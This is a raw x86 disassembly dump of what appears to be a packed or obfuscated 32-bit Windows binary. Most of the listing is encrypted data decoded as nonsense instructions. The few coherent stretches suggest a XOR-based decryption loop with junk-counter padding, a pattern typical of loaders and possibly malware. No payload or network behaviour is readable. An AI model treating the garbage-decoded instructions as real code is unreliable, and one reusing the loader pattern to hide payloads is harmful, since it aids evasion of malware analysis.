  403085:	scas   eax,DWORD PTR es:[edi]
  403086:	push   ebp
  403087:	cmp    cl,BYTE PTR [eax-0x743aee8b]
  40308d:	mov    dl,0xab
  40308f:	aam    0x6
  403091:	mov    esi,0xa19637de
  403096:	push   edx
  403097:	add    al,0xf0
  403099:	sbb    eax,0x6bac8201
  40309e:	test   BYTE PTR [esi],bh
  4030a0:	sub    cl,ah
  4030a2:	mov    dl,0xbe
  4030a4:	pusha  
  4030a5:	ret    0x7f60
  4030a8:	or     DWORD PTR [esp+esi*4-0x634104ac],esi
  4030af:	jb     0x4030e3
  4030b1:	add    BYTE PTR [ebx+0x7d8bf845],cl
  4030b7:	cld    
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x4e
  4030ce:	(bad)  
  4030cf:	ret    0xfc05
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0x1670707e
  4030da:	pop    ds
  4030db:	and    cl,BYTE PTR [edx]
  4030dd:	mov    dh,0xa5
  4030df:	mov    eax,0x93e7092d
  4030e4:	push   ebx
  4030e5:	sub    ecx,DWORD PTR [eax-0x75fa53bf]
  4030eb:	add    BYTE PTR [edx],al
  4030ed:	sub    eax,DWORD PTR [eax+0x1d37f13a]
  4030f3:	push   esp
  4030f4:	mov    ch,0x38
  4030f6:	clc    
  4030f7:	mul    BYTE PTR ds:0xd720d6f7
  4030fd:	jo     0x4030d7
  4030ff:	adc    BYTE PTR [edx+eax*2],dl
  403102:	xor    ch,al
  403104:	sbb    eax,0x1d36ab34
  403109:	loope  0x4030bf
  40310b:	pusha  
  40310c:	and    al,0xb3
  40310e:	popf   
  40310f:	and    eax,0x7e81c3af
  403114:	rcl    BYTE PTR [edi+0x2d8a163],1
  40311a:	test   BYTE PTR [edx],ah
  40311c:	cli    
  40311d:	sbb    ecx,DWORD PTR [eax+eax*8-0xec93ed0]
  403124:	adc    BYTE PTR [ecx-0x62],dl
  403127:	xchg   edi,eax
  403128:	iret   
  403129:	xor    al,bh
  40312b:	jmp    0x1c7588fb
  403130:	xor    ebx,DWORD PTR [ecx*4-0x452739c6]
  403137:	in     eax,0x32
  403139:	mov    ebx,0x1497a37e
  40313e:	rcr    edx,cl
  403140:	mov    ds:0x339fe2b6,eax
  403145:	je     0x403136
  403147:	jno    0x403153
  403149:	cdq    
  40314a:	outs   dx,BYTE PTR ds:[esi]
  40314b:	lods   al,BYTE PTR ds:[esi]
  40314c:	int    0xaa
  40314e:	sbb    DWORD PTR [ecx+0x3c],0xa
  403152:	jns    0x4030e4
  403154:	hlt    
  403155:	(bad)
  403158:	(bad)  
  403159:	lods   al,BYTE PTR ds:[esi]
  40315a:	mov    dh,bl
  40315c:	fsubr  DWORD PTR [edi]
  40315e:	popa   
  40315f:	fmulp  st(6),st
  403161:	pop    esp
  403162:	or     eax,0xf75ea063
  403167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403168:	fldenv [ebx+0x7c0572c7]
  40316e:	adc    dh,BYTE PTR [edi-0x68]
  403171:	push   ecx
  403172:	cmc    
  403173:	ins    BYTE PTR es:[edi],dx
  403174:	sahf   
  403175:	mov    DWORD PTR [edx-0x33],ebp
  403178:	pusha  
  403179:	sub    BYTE PTR ds:0x7bdc76ae,ch
  40317f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  403181:	dec    esi
  403182:	(bad)  
  403183:	sub    eax,0x442e237b
  403188:	pop    ds
  403189:	inc    edx
  40318a:	push   ebp
  40318b:	mov    al,0x33
  40318d:	sub    eax,0x9822c967
  403192:	xchg   ecx,eax
  403193:	jecxz  0x4031c9
  403195:	dec    esp
  403196:	jno    0x403215
  403198:	xchg   ebp,eax
  403199:	loop   0x403188
  40319b:	pop    ss
  40319c:	fmul   st(3),st
  40319e:	pop    esi
  40319f:	fcmovu st,st(4)
  4031a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031a2:	in     eax,0x33
  4031a4:	ret    0xa61b
  4031a7:	test   al,0xb4
  4031a9:	add    DWORD PTR [ebp-0x242c0a81],0xc24d72b6
  4031b3:	inc    esp
  4031b4:	cld    
  4031b5:	fs push ss
  4031b7:	push   DWORD PTR [edx+0x34]
  4031ba:	mov    dl,0x6
  4031bc:	repnz lock push eax
  4031bf:	jno    0x403164
  4031c1:	jbe    0x40319d
  4031c3:	dec    ebp
  4031c4:	adc    BYTE PTR [ecx+ebp*4+0x2c653b05],0x7f
  4031cc:	push   0x47
  4031ce:	dec    ebx
  4031cf:	fsincos 
  4031d1:	mov    cs,WORD PTR [ecx-0x1d4fc068]
  4031d7:	ret    0x4eda
  4031da:	add    eax,0x3f0f78d2
  4031df:	mov    ebp,0x11ff32a
  4031e4:	data16 and BYTE PTR [edi],ah
  4031e7:	inc    esp
  4031e8:	outs   dx,DWORD PTR ds:[esi]
  4031e9:	mov    ds:0x9e081ce6,eax
  4031ee:	test   al,0x1e
  4031f1:	inc    edx
  4031f2:	cmp    al,0xc7
  4031f4:	dec    ebx
  4031f5:	mov    eax,ds:0xb8b398a8
  4031fa:	pop    ss
  4031fb:	add    DWORD PTR [ecx],0xa0926a73
  403201:	cdq    
  403202:	sub    eax,0xa08c8892
  403207:	test   BYTE PTR [eax],ah
  403209:	push   es
  40320a:	adc    eax,0x4fbcc8ca
  40320f:	xlat   BYTE PTR ds:[ebx]
  403210:	mov    al,0xff
  403212:	push   eax
  403213:	push   esp
  403214:	cmc    
  403215:	dec    eax
  403216:	jmp    0xc60:0xf159f268
  40321d:	mov    ah,0x6a
  40321f:	jbe    0x4031e4
  403221:	mov    ah,0x4f
  403223:	and    eax,0x90a9984
  403228:	pusha  
  403229:	movsx  edx,BYTE PTR [ecx]
  40322c:	fwait
  40322d:	aas    
  40322e:	and    eax,0x609305ad
  403233:	adc    BYTE PTR [edi-0x4e],ch
  403236:	cdq    
  403237:	retf   0x3f7a
  40323a:	fstp   TBYTE PTR [edi+0x5ce5071b]
  403240:	mov    edi,0xd97390c7
  403245:	cs lock out dx,al
  403248:	les    ebp,FWORD PTR [ebp+0x6c]
  40324b:	adc    eax,0x59351507
  403250:	lods   al,BYTE PTR ds:[esi]
  403251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403252:	pop    edi
  403253:	rcl    DWORD PTR [edx-0xca9788e],0x17
  40325a:	bts    DWORD PTR [edi],esp
  40325d:	dec    edx
  40325e:	imul   edi,DWORD PTR [eax+0x12d4fcb8],0x2c
  403265:	sub    bh,BYTE PTR [edx+0x62]
  403268:	push   ebx
  403269:	jge    0x40323c
  40326b:	sub    bl,BYTE PTR [ecx+0x664f68ef]
  403271:	and    al,0xbe
  403273:	xchg   ebx,eax
  403274:	adc    eax,0xc439274f
  403279:	push   ecx
  40327a:	mov    al,ds:0xa5cdb108
  40327f:	inc    ecx
  403280:	jns    0x40320b
  403282:	jb     0x4032aa
  403284:	pop    ebp
  403285:	pop    edx
  403286:	(bad)
  403289:	push   cs
  40328a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40328b:	femms  
  40328d:	or     ebx,ecx
  40328f:	jmp    0x501c9075
  403294:	ret    
  403295:	les    esp,FWORD PTR [eax+0x7a]
  403298:	xchg   BYTE PTR [ecx+0x56],ch
  40329b:	popa   
  40329c:	sub    bh,BYTE PTR [ebx+0x2d76ff54]
  4032a2:	push   es
  4032a3:	jo     0x40328a
  4032a5:	xchg   edi,eax
  4032a6:	outs   dx,DWORD PTR ds:[esi]
  4032a7:	push   0xffffff9c
  4032a9:	pusha  
  4032aa:	mov    al,cs:0x62e0014
  4032b0:	push   edi
  4032b1:	addr16 out 0xd5,eax
  4032b4:	loope  0x4032df
  4032b6:	jg     0x4032b0
  4032b8:	jl     0x4032ea
  4032ba:	call   DWORD PTR [edi-0x58]
  4032bd:	adc    esp,DWORD PTR [ebx+eiz*1+0x33]
  4032c1:	sbb    BYTE PTR [esi+0x0],0x16
  4032c5:	mov    ds:0x1e3ced67,eax
  4032ca:	rol    BYTE PTR [edx],cl
  4032cc:	xor    ah,bl
  4032ce:	(bad)  
  4032cf:	mov    edx,0x81cf684e
  4032d4:	and    eax,0x57b3007e
  4032d9:	mov    esi,0x57b47ea9
  4032de:	mov    edx,0xd4e60305
  4032e3:	push   0x79
  4032e5:	ficom  WORD PTR [edx+0x5a]
  4032e8:	ss cmp esp,edx
  4032eb:	nop
  4032ec:	mov    ebx,0x9c14bc75
  4032f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032f2:	cwde   
  4032f3:	retf   0x35cb
  4032f6:	or     esp,DWORD PTR [edx-0x3fd66699]
  4032fc:	sub    BYTE PTR [esp+esi*8+0x153d71d5],dh
  403303:	xor    DWORD PTR [edi],ebx
  403305:	sub    dl,bl
  403307:	mov    ch,0x66
  403309:	arpl   WORD PTR [eax],di
  40330b:	fwait
  40330c:	sub    al,0xf2
  40330e:	jnp    0x4032a6
  403310:	push   ebp
  403311:	cmp    bh,al
  403313:	stc    
  403314:	mov    bl,0xc9
  403316:	bound  ebx,QWORD PTR [edx+edx*1-0x7ffe4793]
  40331d:	je     0x4032bb
  40331f:	repnz mov ah,0xd2
  403322:	cs fdivr st,st(5)
  403325:	add    ah,ah
  403327:	mov    ds:0xa94f6f21,eax
  40332c:	arpl   WORD PTR [edx-0x6abbe168],di
  403332:	mov    esi,0xefd156c0
  403337:	pop    edi
  403338:	mov    cl,0x2a
  40333a:	jle    0x4032ff
  40333c:	mov    bl,0xb7
  40333e:	fdivr  DWORD PTR [ebp+eiz*8+0x28da5544]
  403345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403346:	mov    al,0x37
  403348:	xchg   ebp,eax
  403349:	bound  esp,QWORD PTR [eax]
  40334b:	sbb    BYTE PTR [edx-0x4e23422c],0x2d
  403352:	stc    
  403353:	aam    0xd5
  403355:	pop    ds
  403356:	xlat   BYTE PTR ds:[ebx]
  403357:	mov    ebx,0xc7b9c421
  40335c:	jno    0x40333d
  40335e:	jle    0x4033cd
  403360:	pop    eax
  403361:	pop    edi
  403362:	fild   WORD PTR [ecx]
  403364:	inc    ebp
  403365:	fs stc 
  403367:	or     dh,ch
  403369:	pushf  
  40336a:	inc    esi
  40336b:	push   ebx
  40336c:	cmp    ch,BYTE PTR [esp+eax*1+0x78]
  403370:	int    0xa3
  403372:	jnp    0x403303
  403374:	jge    0x403317
  403376:	xchg   edi,eax
  403377:	push   ss
  403378:	inc    ebx
  403379:	lahf   
  40337a:	repz or BYTE PTR [esi-0x44],0xfb
  40337f:	sbb    al,0x75
  403381:	push   esp
  403382:	ins    BYTE PTR es:[edi],dx
  403383:	test   BYTE PTR [ebp-0x4c],ah
  403386:	vpcmov ymm11,ymm2,YMMWORD PTR [esi+ecx*1],ymm4
  40338d:	(bad)  
  40338f:	clc    
  403390:	fdivr  QWORD PTR [edx-0x278c8d24]
  403396:	pop    esp
  403397:	inc    ebx
  403398:	imul   ebp,DWORD PTR [eax],0x26
  40339b:	mov    esi,DWORD PTR [ebp+0x8]
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	pusha  
  4033ba:	icebp  
  4033bb:	ror    BYTE PTR [edx+edi*1+0x14],cl
  4033bf:	jo     0x403431
  4033c1:	mov    esi,0xbd70707e
  4033c6:	ins    BYTE PTR es:[edi],dx
  4033c7:	pop    edi
  4033c8:	add    ah,BYTE PTR [edx+0x757fab94]
  4033ce:	sub    BYTE PTR [ebp+ecx*8-0x4a],al
  4033d2:	pop    ecx
  4033d3:	repz mov ds:0x24458f7,al
  4033d9:	aas    
  4033da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033db:	jge    0x4033a2
  4033dd:	inc    edx
  4033de:	out    0xcb,eax
  4033e0:	mov    WORD PTR [esp+edx*8+0x1925d463],?
  4033e7:	(bad)  
  4033e8:	cli    
  4033e9:	nop
  4033ea:	je     0x403373
  4033ec:	ins    DWORD PTR es:[edi],dx
  4033ed:	out    0x4b,al
  4033ef:	add    eax,0x840f57ec
  4033f4:	and    ecx,DWORD PTR [edi]
  4033f6:	pop    ss
  4033f7:	pop    esp
  4033f8:	pop    ss
  4033f9:	addr16 cmp eax,0x1c3ad4e1
  4033ff:	or     DWORD PTR es:[ebx+0x7c],esi
  403403:	inc    esp
  403404:	add    edx,DWORD PTR [ebx-0x82c22e2]
  40340a:	test   BYTE PTR [ecx],0x70
  40340d:	int    0x2d
  40340f:	dec    ebx
  403410:	shl    bl,1
  403412:	aas    
  403413:	cmp    dl,0xa0
  403416:	xchg   BYTE PTR [esi],bh
  403418:	fwait
  403419:	inc    ebp
  40341a:	inc    ebx
  40341b:	out    dx,al
  40341c:	pop    ds
  40341d:	sbb    esi,ebp
  40341f:	iret   
  403420:	(bad)  
  403421:	adc    al,0x26
  403423:	inc    ebx
  403424:	add    esi,ecx
  403426:	sbb    BYTE PTR [edi],bh
  403428:	arpl   bx,bp
  40342a:	and    al,0x1
  40342c:	cdq    
  40342d:	pusha  
  40342e:	js     0x40348a
  403430:	aad    0x4f
  403432:	push   edi
  403433:	int    0x2
  403435:	lock add DWORD PTR [eax+0x335be0d3],esp
  40343c:	cmp    bh,BYTE PTR [esi+0x131a59c7]
  403442:	mov    ebp,0x49c4e67d
  403447:	jnp    0x40345d
  403449:	cwde   
  40344a:	fsub   DWORD PTR [ecx+eax*2-0x5fe0e763]
  403451:	addr16 dec edi
  403453:	push   ebx
  403454:	fiadd  WORD PTR [edx-0xba6ca21]
  40345a:	and    eax,0x2b1031d0
  40345f:	repz cmp eax,0x6730886f
  403465:	repnz lds edx,FWORD PTR [eax+0x66]
  403469:	outs   dx,BYTE PTR ds:[esi]
  40346a:	mov    bl,0xaf
  40346c:	or     al,0x82
  40346e:	push   eax
  40346f:	jmp    0x4034f0
  403471:	ins    DWORD PTR es:[edi],dx
  403472:	fcom   DWORD PTR [esi-0x77]
  403475:	inc    ecx
  403476:	jmp    0x40340e
  403478:	bound  ebp,QWORD PTR [ebx+0x60]
  40347b:	mov    BYTE PTR [ecx-0x5f],dl
  40347e:	loope  0x40342b
  403480:	std    
  403481:	and    dl,BYTE PTR [eax+ebp*2-0x15]
  403485:	adc    ebx,ebx
  403487:	loope  0x4034f1
  403489:	dec    edi
  40348a:	xor    ecx,DWORD PTR [ecx]
  40348c:	xor    BYTE PTR [ecx-0x599cca51],ch
  403492:	dec    esp
  403493:	into   
  403494:	clc    
  403495:	nop
  403496:	push   es
  403497:	mov    ebx,0x92cebd04
  40349c:	mov    cl,0x6f
  40349e:	bound  ebp,QWORD PTR [ebp+0x30a82f21]
  4034a4:	mov    eax,ds:0xfa9a807f
  4034a9:	jl     0x403487
  4034ab:	mov    cl,0x78
  4034ad:	pop    edx
  4034ae:	and    al,0xf5
  4034b0:	out    dx,al
  4034b1:	hlt    
  4034b2:	scas   al,BYTE PTR es:[edi]
  4034b3:	push   ebp
  4034b4:	inc    ebp
  4034b5:	mul    DWORD PTR [esi]
  4034b7:	jae    0x403508
  4034b9:	xchg   ecx,eax
  4034ba:	push   ss
  4034bb:	call   0x39a6:0x69819ef5
  4034c2:	mov    edi,0x59733062
  4034c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034c8:	arpl   si,sp
  4034ca:	xor    BYTE PTR [edx*8+0x25e6f72e],ah
  4034d1:	stos   DWORD PTR es:[edi],eax
  4034d2:	sbb    al,0xbc
  4034d4:	mov    eax,0x140dff5b
  4034d9:	stc    
  4034da:	clc    
  4034db:	in     al,0x9b
  4034dd:	cmp    eax,0xf1a2427f
  4034e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034e3:	push   ebx
  4034e4:	je     0x40351d
  4034e6:	add    esi,DWORD PTR [edx+0x27b0946c]
  4034ec:	mov    ds:0xfeec61cd,eax
  4034f1:	ins    DWORD PTR es:[edi],dx
  4034f2:	inc    ebx
  4034f3:	test   DWORD PTR [esi-0x1c],esp
  4034f6:	pop    edx
  4034f7:	xor    ch,BYTE PTR ds:0xf1f30616
  4034fd:	inc    eax
  4034fe:	xchg   ecx,esi
  403500:	outs   dx,DWORD PTR ds:[esi]
  403501:	mov    al,0x7f
  403503:	aas    
  403504:	push   ebp
  403505:	es inc edi
  403507:	sub    eax,0x7a201556
  40350c:	lds    edx,FWORD PTR [edx-0x1d]
  40350f:	adc    esp,ecx
  403511:	mov    ebx,0x9c9ebede
  403516:	ret    
  403517:	xchg   esp,eax
  403518:	aas    
  403519:	mov    eax,0x9cd3c9e8
  40351e:	mov    ah,0xba
  403520:	call   0x2e3e:0xc020794a
  403527:	cmpps  xmm2,XMMWORD PTR [eax-0x5382ae8a],0x80
  40352f:	popf   
  403530:	cmp    dh,BYTE PTR [edx-0x6c]
  403533:	or     ah,bl
  403535:	mov    dh,0x37
  403537:	sub    al,0x17
  403539:	frstor [edx-0x39]
  40353c:	inc    ebp
  40353d:	lea    edx,[ebx]
  40353f:	or     BYTE PTR [esi+0x5095c49f],ah
  403545:	popa   
  403546:	adc    eax,0x1f5e2f35
  40354b:	shl    BYTE PTR [ebx+0xab27e46],cl
  403551:	ins    DWORD PTR es:[edi],dx
  403552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403553:	aaa    
  403554:	jbe    0x403543
  403556:	sub    dh,BYTE PTR [eax+0x1e]
  403559:	dec    edi
  40355a:	das    
  40355b:	repz jle 0x40353c
  40355e:	dec    ecx
  40355f:	cmp    eax,0xfdfa9d91
  403564:	pop    edi
  403565:	push   ss
  403566:	sahf   
  403567:	jle    0x403565
  403569:	fbld   TBYTE PTR [ebp-0x4c18303c]
  40356f:	xchg   DWORD PTR [edx-0x2e],esp
  403572:	scas   eax,DWORD PTR es:[edi]
  403573:	js     0x403564
  403575:	push   ecx
  403576:	and    eax,0x438f04c8
  40357b:	test   al,0x73
  40357d:	ss js  0x4035b6
  403580:	mov    ecx,0xb990490b
  403585:	shl    BYTE PTR ds:0xcb251459,cl
  40358b:	mov    edx,cr1
  40358e:	fmul   QWORD PTR [ebp+0x2e2a1b23]
  403594:	push   ecx
  403595:	push   ss
  403596:	add    dh,BYTE PTR [esi]
  403598:	mov    WORD PTR [ebx],fs
  40359a:	test   DWORD PTR [edx-0x52ade070],edx
  4035a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035a1:	jmp    0xa0a7:0x1bc97e4b
  4035a8:	inc    edx
  4035a9:	push   esi
  4035aa:	aas    
  4035ab:	pop    ss
  4035ac:	and    ah,dh
  4035ae:	retf   0x1299
  4035b1:	jle    0x403589
  4035b3:	loopne 0x403619
  4035b5:	iret   
  4035b6:	and    bl,BYTE PTR [edx-0x24]
  4035b9:	xchg   ebx,eax
  4035ba:	ror    DWORD PTR [ebp-0x13],0x17
  4035be:	leave  
  4035bf:	jb     0x40360e
  4035c1:	mov    esi,0xcf2a5380
  4035c6:	or     al,0x32
  4035c8:	mov    edx,0xfb399f8
  4035cd:	xchg   ecx,eax
  4035ce:	push   ebx
  4035cf:	leave  
  4035d0:	loope  0x403640
  4035d2:	in     al,dx
  4035d3:	pop    ebx
  4035d4:	sbb    DWORD PTR [esi],0x67
  4035d7:	ror    BYTE PTR [ecx],1
  4035d9:	pop    ebx
  4035da:	add    eax,DWORD PTR ds:0x60156355
  4035e0:	mov    ch,0x38
  4035e2:	push   ss
  4035e3:	adc    DWORD PTR [ebx+ecx*2-0x16b2a511],ecx
  4035ea:	fcomp  DWORD PTR [esi-0x5ff0d45e]
  4035f0:	in     al,0x5b
  4035f2:	jo     0x403672
  4035f4:	sub    cl,BYTE PTR [eax-0x67]
  4035f7:	stc    
  4035f8:	fcomp  DWORD PTR [ebx+edx*2+0x24332549]
  4035ff:	or     esi,0xf07542d3
  403605:	jne    0x403663
  403607:	xchg   esp,eax
  403608:	cld    
  403609:	mov    ds:0xc8b70e67,al
  40360e:	lds    edi,FWORD PTR ds:0xd95d1562
  403614:	xor    al,0x94
  403616:	ss mov bh,0x3a
  403619:	out    0x8,al
  40361b:	arpl   WORD PTR [esi+0x33],bx
  40361e:	bound  ebx,QWORD PTR [edi+esi*8]
  403621:	(bad)  [ecx-0x7a87059e]
  403627:	jle    0x40363a
  403629:	xchg   DWORD PTR [ebx+0x12],esi
  40362c:	mov    ecx,DWORD PTR [esi+0x4bdc5262]
  403632:	mov    cs,edx
  403634:	call   0x2523:0x92294018
  40363b:	and    cl,ch
  40363d:	inc    esp
  40363e:	push   esi
  40363f:	sbb    BYTE PTR [ecx-0x60],0xf4
  403643:	(bad)
  403646:	sub    ch,BYTE PTR [ecx-0x14]
  403649:	xorps  xmm6,xmm6
  40364c:	push   cs
  40364d:	aas    
  40364e:	mov    esi,0xb6e0b587
  403653:	adc    DWORD PTR [edx-0x16],esp
  403656:	int    0xe6
  403658:	lock mov al,0x2c
  40365b:	popa   
  40365c:	aam    0xbc
  40365e:	clc    
  40365f:	lock loop 0x4036a0
  403662:	fisttp DWORD PTR [edi+0x60]
  403665:	xchg   edx,eax
  403666:	push   esi
  403667:	sub    edx,edx
  403669:	mov    ecx,0x9aec7f19
  40366e:	pop    ecx
  40366f:	fild   WORD PTR [edi-0x27]
  403672:	xchg   edi,eax
  403673:	ficomp WORD PTR [ecx-0x6da9f73f]
  403679:	xor    al,0xd6
  40367b:	mov    es,WORD PTR [edi+0x19c9c1ae]
  403681:	clc    
  403682:	inc    eax
  403683:	inc    esi
  403684:	enter  0x7b67,0x8a
  403688:	test   BYTE PTR [ebx],al
  40368a:	pushf  
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [ebp+0x78e02cc8],edi
  4037a6:	adc    DWORD PTR [eax+0x70],esi
  4037a9:	cmp    eax,0xa770707d
  4037ae:	test   DWORD PTR [ebx+ecx*2],ecx
  4037b1:	(bad)
  4037b4:	dec    esi
  4037b5:	cdq    
  4037b6:	add    eax,0x488afa2b
  4037bb:	mov    esp,0x8297cb49
  4037c0:	sahf   
  4037c1:	pop    eax
  4037c2:	or     BYTE PTR [esi+0xab832b8],dh
  4037c8:	jmp    0xfb29:0x378dbe53
  4037cf:	or     eax,0xa51e77ff
  4037d4:	(bad)  
  4037d5:	cmc    
  4037d6:	test   dl,bh
  4037d8:	cmp    al,bh
  4037da:	outs   dx,DWORD PTR ds:[esi]
  4037db:	xchg   esi,eax
  4037dc:	ss aaa 
  4037de:	xchg   ecx,eax
  4037df:	xchg   BYTE PTR [edi-0x739aeac0],al
  4037e5:	fisubr DWORD PTR [esi]
  4037e7:	hlt    
  4037e8:	or     DWORD PTR [esi-0x7b],ecx
  4037eb:	(bad)  
  4037ec:	stos   BYTE PTR es:[edi],al
  4037ed:	dec    esp
  4037ee:	out    dx,eax
  4037ef:	push   ecx
  4037f0:	nop
  4037f1:	or     al,0xc
  4037f3:	div    BYTE PTR [esi+0x4a]
  4037f6:	fidiv  DWORD PTR ds:0x56f6c607
  4037fc:	push   ebx
  4037fd:	out    dx,eax
  4037fe:	enter  0x1781,0x1c
  403802:	mov    eax,ds:0x17ccfce0
  403807:	repnz xchg ecx,eax
  403809:	jne    0x403854
  40380b:	adc    bl,BYTE PTR [eax]
  40380d:	std    
  40380e:	xchg   ebp,ebx
  403810:	mov    edx,0x306c2848
  403815:	cmp    DWORD PTR ds:0xd86ace5b,esi
  40381b:	sub    esp,ecx
  40381d:	xchg   esp,eax
  40381e:	or     edi,DWORD PTR [esi+0x41736eda]
  403824:	dec    ecx
  403825:	cmp    dh,BYTE PTR [ecx+ebp*1-0x978e382]
  40382c:	sbb    BYTE PTR [ebp+0x74],bl
  40382f:	jnp    0x403897
  403831:	imul   esp,DWORD PTR [ebx+0x719b06c1],0x60ebe5e4
  40383b:	sub    al,0x41
  40383d:	stc    
  40383e:	sbb    edi,DWORD PTR [edx]
  403840:	mov    ecx,0x17226804
  403845:	and    DWORD PTR [edi],0x5653c528
  40384b:	adc    DWORD PTR [edx+esi*4],ebp
  40384e:	push   0xd6380754
  403853:	scas   eax,DWORD PTR es:[edi]
  403854:	sub    bl,dh
  403856:	mov    esi,0x5c458ed5
  40385b:	jno    0x403815
  40385d:	jae    0x40387b
  40385f:	paddusw mm5,QWORD PTR [eax+edx*8+0x63]
  403864:	xchg   esi,eax
  403865:	jne    0x4038c7
  403867:	add    al,0x63
  403869:	rcl    DWORD PTR [ecx-0x1],1
  40386c:	and    al,bl
  40386e:	imul   BYTE PTR ds:0x479912f6
  403874:	mov    ds:0xc8926a58,al
  403879:	das    
  40387a:	jo     0x403876
  40387c:	push   es
  40387d:	pop    esp
  40387e:	imul   ebx,edx,0x10
  403881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403882:	push   edi
  403883:	mov    eax,0x725d59ce
  403888:	int3   
  403889:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40388b:	mov    esi,0x220a82fd
  403890:	xor    eax,0xe3c52bfd
  403895:	cdq    
  403896:	sti    
  403897:	dec    ebx
  403898:	mov    ebx,0xc2f07a8f
  40389d:	icebp  
  40389e:	fwait
  40389f:	popa   
  4038a0:	ss aad 0x33
  4038a3:	adc    dl,BYTE PTR [edx]
  4038a5:	jo     0x403887
  4038a7:	pop    ebp
  4038a8:	lahf   
  4038a9:	pop    esp
  4038aa:	mov    edx,0x45c902d3
  4038af:	shl    ecx,cl
  4038b1:	dec    esi
  4038b2:	lds    eax,FWORD PTR [ebx+0x52]
  4038b5:	push   0xcbf518ee
  4038ba:	mov    bl,BYTE PTR [ecx+ebx*8+0x7fa29d16]
  4038c1:	jb     0x40392c
  4038c3:	cld    
  4038c4:	xor    BYTE PTR [edx-0x7ac3c2da],ah
  4038ca:	mov    esi,0x13135c94
  4038cf:	cld    
  4038d0:	enter  0x2248,0xcb
  4038d4:	mov    al,0xab
  4038d6:	inc    ebx
  4038d7:	mov    ds:0xb94bc3b1,eax
  4038dc:	loopne 0x403936
  4038de:	fwait
  4038df:	and    DWORD PTR [edx-0x49],ebp
  4038e2:	mov    WORD PTR [esi+0x17],cs
  4038e5:	rol    DWORD PTR [eax-0x33],1
  4038e8:	and    ch,BYTE PTR [ebp-0x1ed5d0b1]
  4038ee:	cld    
  4038ef:	mov    ch,0xec
  4038f1:	xchg   ecx,esp
  4038f3:	xchg   edx,eax
  4038f4:	lahf   
  4038f5:	stos   BYTE PTR es:[edi],al
  4038f6:	dec    esi
  4038f7:	cli    
  4038f8:	add    al,0xa7
  4038fa:	dec    ebp
  4038fb:	repnz not BYTE PTR [esi]
  4038fe:	add    al,0xa3
  403900:	adc    dl,bl
